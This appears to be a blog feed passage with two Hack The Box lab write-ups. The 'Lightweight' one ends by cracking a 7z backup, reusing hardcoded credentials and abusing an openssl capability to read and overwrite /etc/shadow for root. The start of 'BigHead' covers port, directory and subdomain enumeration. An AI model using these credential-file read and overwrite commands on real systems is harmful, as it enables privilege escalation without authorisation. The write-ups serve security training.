&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;bruteforcing-7z-hardcoded-credentials-privilege-escalation-to-ldapuser1&quot;&gt;Bruteforcing &lt;code class=&quot;highlighter-rouge&quot;&gt;7z&lt;/code&gt;, Hardcoded Credentials, Privilege Escalation to &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&quot;in-the-home-directory-of-ldapuser2-there-was-a-backup-file-called-backup7z-i-tried-to-extract-it-but-it-was-password-protected-&quot;&gt;In the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser2&lt;/code&gt; there was a backup file called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.7z&lt;/code&gt;. I tried to extract it but it was password protected :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-transferred-it-to-my-box-to-bruteforce-it-nc-wasnt-installed-and-i-couldnt-use-scp-so-i-transferred-it-with-base64-encodingdecoding-&quot;&gt;So I transferred it to my box to bruteforce it (&lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; wasn’t installed and I couldn’t use &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt; so I transferred it with base64 encoding/decoding) :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/17.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-used-this-tool-to-bruteforce-the-7z-file-&quot;&gt;I used &lt;a href=&quot;https://github.com/Seyptoo/7z-BruteForce&quot;&gt;this tool&lt;/a&gt; to bruteforce the &lt;code class=&quot;highlighter-rouge&quot;&gt;7z&lt;/code&gt; file :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python 7z.py backup.7z /usr/share/wordlists/rockyou.txt&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-password-is-delete-after-extraction-we-have-some-php-files-looks-like-the-source-of-the-web-site-hosted-on-port-80-&quot;&gt;The password is &lt;code class=&quot;highlighter-rouge&quot;&gt;delete&lt;/code&gt;. After extraction we have some &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; files, Looks like the source of the web site hosted on port 80 :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-them-all-and-in-statusphp-i-found-hardcoded-credentials-for-ldapuser1-&quot;&gt;I checked them all and in &lt;code class=&quot;highlighter-rouge&quot;&gt;status.php&lt;/code&gt; I found hardcoded credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-su-to-ldapuser1-with-the-password--f3ca9d298a553da117442deeb6fa932d-&quot;&gt;Now we can &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt; with the password : &lt;code class=&quot;highlighter-rouge&quot;&gt;f3ca9d298a553da117442deeb6fa932d&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;openssl-capabilities-root-flag&quot;&gt;Openssl Capabilities, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;i-looked-at-the-contents-of-homeldapuser1-and-i-noticed-some-stuff-a-php-file-called-ldaptlsphp-and-two-binaries--openssl-and-tcpdump&quot;&gt;I looked at the contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/ldapuser1&lt;/code&gt; and I noticed some stuff. A &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapTLS.php&lt;/code&gt; and two binaries : &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/24.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;cat ldapTLS.php&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nothing-interesting-lets-check-the-binaries-we-dont-need-tcpdump-anymore-so-we-will-focus-on-openssl&quot;&gt;Nothing interesting. Lets check the binaries. (We don’t need &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; anymore so we will focus on &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt;)&lt;/h4&gt;
&lt;h4 id=&quot;i-checked-the-capabilities-and-i-found-that-openssl-has-the-ep-capability-which-means-it-can-read-and-write-anything-on-the-filesystem&quot;&gt;I checked the capabilities and I found that &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; has the &lt;code class=&quot;highlighter-rouge&quot;&gt;ep&lt;/code&gt; capability which means it can read and write anything on the filesystem.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this--means-that-we-can-simply-read-the-root-flag-by-using-the-base64-encoding-function-in-openssl-then-decoding-the-file-&quot;&gt;This  means that we can simply read the root flag by using the base64 encoding function in &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; then decoding the file :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./openssl enc -base64 -in /root/root.txt -out ./root.txt.b64&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -d root.txt.b64&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-also-get-a-root-shell-by-overwriting-etcpasswd-or-etcshadow-i-got-a-copy-of-the-original-shadow-file-first-&quot;&gt;We can also get a root shell by overwriting &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt;. I got a copy of the original &lt;code class=&quot;highlighter-rouge&quot;&gt;shadow&lt;/code&gt; file first :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./openssl enc -base64 -in /etc/shadow -out ./shadow.b64&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -d shadow.b64 &amp;gt; shadow&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-used-openssl-to-create-a-salted-password-i-used-root-as-the-salt-and-rick-as-the-password-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; to create a salted password. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; as the salt and &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt; as the password :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl passwd -1 -salt root rick&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-edited-the-copy-i-have-of-etcshadow-and-replaced-the-root-password-with-the-new-one-&quot;&gt;Then I edited the copy I have of &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; and replaced the root password with the new one :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-finally-i-used-openssl-to-replace-the-old-etcshadow-with-the-new-one-and-after-that-we-can-do-su-root-with-the-password-rick&quot;&gt;And finally I used &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; to replace the old &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; with the new one and after that we can do &lt;code class=&quot;highlighter-rouge&quot;&gt;su root&lt;/code&gt; with the password &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt;:&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./openssl enc -in shadow -out /etc/shadow&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---bighead&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/bighead/&quot;&gt;Hack The Box - BigHead&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---conceal&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/conceal/&quot;&gt;Hack The Box - Conceal&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="ssh" /><category term="Binary Exploitation" /><category term="Networking" /><category term="Forensics" /><summary type="html">Quick Summary Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is 10.10.10.119, I added it to /etc/hosts as lightweight.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC lightweight.htb 3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first. Ldap Enumeration To enumerate ldap I like to use a tool called ldapsearch, There’s also an nmap script called ldap-search that can do the same thing. ldapsearch : ldapsearch -x -h lightweight.htb -b &quot;dc=lightweight,dc=htb&quot; Full Output : ``` extended LDIF # LDAPv3 base &amp;lt;dc=lightweight,dc=htb&amp;gt; with scope subtree filter: (objectclass=*) requesting: ALL #</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/lightweight/0.png" /></entry><entry><title type="html">Hack The Box - BigHead</title><link href="http://localhost:4000/hack-the-box/bighead/" rel="alternate" type="text/html" title="Hack The Box - BigHead" /><published>2019-05-04T00:00:00+02:00</published><updated>2019-05-04T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/bighead</id><content type="html" xml:base="http://localhost:4000/hack-the-box/bighead/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-bighead-retired-and-heres-my-write-up-about-it-as-you-can-see-its-an-insane-box-actually-its-hard-to-summarize-this-box-as-it-included-a-lot-of-steps-to-achieve-different-goals-most-of-the-steps-require-deep-enumeration-especially-the-initial-foothold-the-part-i-liked-the-most-about-this-box-is-the-win32-buffer-overflow-egghunting-exploitation-as-it-was-very-interesting-the-whole-box-was-challenging-and-the-overall-experience-wasnt-bad-but-i-disliked-the-fact-that-it-had-a-lot-of-trolls-i-found-it-kinda-funny-that-the-box-had-a-lot-of-silicon-valley-references-d-even-the-name-of-the-box-is-the-name-of-one-of-the-characters-anyway-lets-not-waste-more-time-its-a-windows-box-and-its-ip-is-101010112-i-added-it-to-etchosts-as-bigheadhtb-lets-jump-right-in-&quot;&gt;Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of &lt;a href=&quot;https://www.imdb.com/title/tt2575988/&quot;&gt;Silicon Valley&lt;/a&gt; references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.112&lt;/code&gt;. I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;bighead.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC bighead.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;only-one-port-is-open-which-is-port-80-and-its-running-http-lets-take-a-look&quot;&gt;Only one port is open which is port 80 and it’s running http. Let’s take a look.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-a-website-titled-pipernet-comes-the-background-is-an-image-of-the-characters-from-the-tv-show-silicon-valley-and-in-the-middle-its-saying-pipernet-is-here-also-there-are-two-links-down-there-first-one-is-this-is-pipernet-which-is-the-homepage-and-the-other-one-is-piedpipercoin-lets-scroll-down-and-see-what-else-do-we-have-&quot;&gt;It’s a website titled &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperNet Comes&lt;/code&gt;. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying &lt;code class=&quot;highlighter-rouge&quot;&gt;PIPERNET IS HERE&lt;/code&gt;. Also there are two links down there, First one is &lt;code class=&quot;highlighter-rouge&quot;&gt;THIS IS PIPERNET&lt;/code&gt; which is the homepage and the other one is &lt;code class=&quot;highlighter-rouge&quot;&gt;PIEDPIPERCOIN&lt;/code&gt;. Let’s scroll down and see what else do we have :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;piedpipercoin-comes-and-theres-a-small-description-of-what-piedpipercoin-is&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PIEDPIPERCOIN COMES&lt;/code&gt;, and there’s a small description of what piedpipercoin is.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-that-there-are-some-pictures-for-the-characters-from-silicon-valley-and-some-stuff-about-each-one-of-them-nothing-is-interesting-so-far-at-the-bottom-of-the-page-there-is-this-contact-form-&quot;&gt;After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-looked-at-the-contact-info-and-i-noticed-that-the-email-was-infobachmanityhtb-lets-check-that-domain-but-before-doing-that-i-wanted-to-check-the-other-page-piedpipercoin-&quot;&gt;I looked at the contact info and I noticed that the email was &lt;code class=&quot;highlighter-rouge&quot;&gt;info@bachmanity.htb&lt;/code&gt;. Let’s check that domain, but before doing that I wanted to check the other page &lt;code class=&quot;highlighter-rouge&quot;&gt;PIEDPIPERCOIN&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;instead-of-piedpipercoin-comes-its-saying-piedpipercoin-came-but-nothing-is-interesting-lets-check-bachmanityhtb-we-need-to-add-it-to-etchosts-first-&quot;&gt;Instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;PIEDPIPERCOIN COMES&lt;/code&gt; it’s saying &lt;code class=&quot;highlighter-rouge&quot;&gt;PIEDPIPERCOIN CAME&lt;/code&gt; but nothing is interesting. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;bachmanity.htb&lt;/code&gt;, we need to add it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; first :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/9.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;bachmanity.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-only-that-image-and-nothing-else-&quot;&gt;It’s only that image and nothing else :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;back-to-the-contact-form-i-wanted-to-see-if-its-exploitable-in-any-way-i-filled-all-the-fields-with-test-&quot;&gt;Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/12.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-sends-the-request-to-mailerbigheadhtb-lets-add-it-to-etchosts-and-try-again-&quot;&gt;It sends the request to &lt;code class=&quot;highlighter-rouge&quot;&gt;mailer.bighead.htb&lt;/code&gt;, Let’s add it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; and try again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/14.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-shows-this-message-then-it-redirects-the-browser-back-to-bigheadhtb-i-also-intercepted-the-request-with-burp-&quot;&gt;It shows this message then it redirects the browser back to &lt;code class=&quot;highlighter-rouge&quot;&gt;bighead.htb&lt;/code&gt;. I also intercepted the request with burp :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/16.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;tried-to-manipulate-the-input-but-couldnt-achieve-anything-i-went-to-mailerbigheadhtb-and-got-redirected-to-mailerbigheadhtbtestlink-which-shows-this-error-&quot;&gt;Tried to manipulate the input, but couldn’t achieve anything. I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;mailer.bighead.htb&lt;/code&gt; and got redirected to &lt;code class=&quot;highlighter-rouge&quot;&gt;mailer.bighead.htb/testlink&lt;/code&gt; which shows this error :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;in-the-background-i-ran-gobuster-on-bachmanityhtb--and-bigheadhtb-with-usrsharewordlistsdirbcommontxt-bachmanityhtb-didnt-have-anything-&quot;&gt;In the background I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;bachmanity.htb&lt;/code&gt;  and &lt;code class=&quot;highlighter-rouge&quot;&gt;bighead.htb&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;bachmanity.htb&lt;/code&gt; didn’t have anything :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bachmanity.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:21:01 Starting gobuster
=====================================================
/index.html (Status: 200)
/index.htm (Status: 200)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;but-bigheadhtb-gave-some-results-&quot;&gt;but &lt;code class=&quot;highlighter-rouge&quot;&gt;bighead.htb&lt;/code&gt; gave some results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bighead.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:16:23 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/backend (Status: 302)
/Images (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-went-to-assets-and-it-was-forbidden-&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/assets&lt;/code&gt; and it was forbidden :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;backend-redirected-the-browser-to-bigheadhtbbighead-which-gave-the-same-error-we-saw-before-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/backend&lt;/code&gt; redirected the browser to &lt;code class=&quot;highlighter-rouge&quot;&gt;bighead.htb/BigHead&lt;/code&gt; which gave the same error we saw before :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-clicked-on-error-log-and-it-gave-the-same-error-&quot;&gt;I clicked on &lt;code class=&quot;highlighter-rouge&quot;&gt;error log&lt;/code&gt; and it gave the same error :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-check-if-there-are-any-other-subdomains-i-used-wfuzz-with-subdomains-top1mil-5000txt-from-seclists&quot;&gt;Let’s check if there are any other subdomains. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; with &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt&quot;&gt;subdomains-top1mil-5000.txt&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;seclists&lt;/a&gt;:&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;non-valid-subdomain-responses-are-11232-chars-so-we-will-remove-those-from-the-output-&quot;&gt;non-valid subdomain responses are &lt;code class=&quot;highlighter-rouge&quot;&gt;11232&lt;/code&gt; chars so we will remove those from the output :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-3-subdomains--dev-mailer-and-code-we-already-know-about-mailer-lets-add-dev-and-code-&quot;&gt;We got 3 subdomains : &lt;code class=&quot;highlighter-rouge&quot;&gt;dev&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;mailer&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;code&lt;/code&gt;. We already know about &lt;code class=&quot;highlighter-rouge&quot;&gt;mailer&lt;/code&gt;, let’s add &lt;code class=&quot;highlighter-rouge&quot;&gt;dev&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;code&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;codebigheadhtb-redirected-the-browser-to-1270015080testlinkloginphp&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;code.bighead.htb&lt;/code&gt; redirected the browser to &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1:5080/testlink/login.php&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/27.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-to-see-whats-on-codebigheadhtb-we-will-probably-need-to-forward-an-internal-service-to-our-box-we-cant-do-that-now-so-we-will-ignore-codebigheadhtb-for-now&quot;&gt;So to see what’s on &lt;code class=&quot;highlighter-rouge&quot;&gt;code.bighead.htb&lt;/code&gt; we will probably need to forward an internal service to our box. We can’t do that now so we will ignore &lt;code class=&quot;highlighter-rouge&quot;&gt;code.bighead.htb&lt;/code&gt; for now.&lt;/h4&gt;
&lt;h4 id=&quot;devbigheadhtb-shows-this-image-of-bighead-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dev.bighead.htb&lt;/code&gt; shows this image of bighead :&lt;/h4&gt;
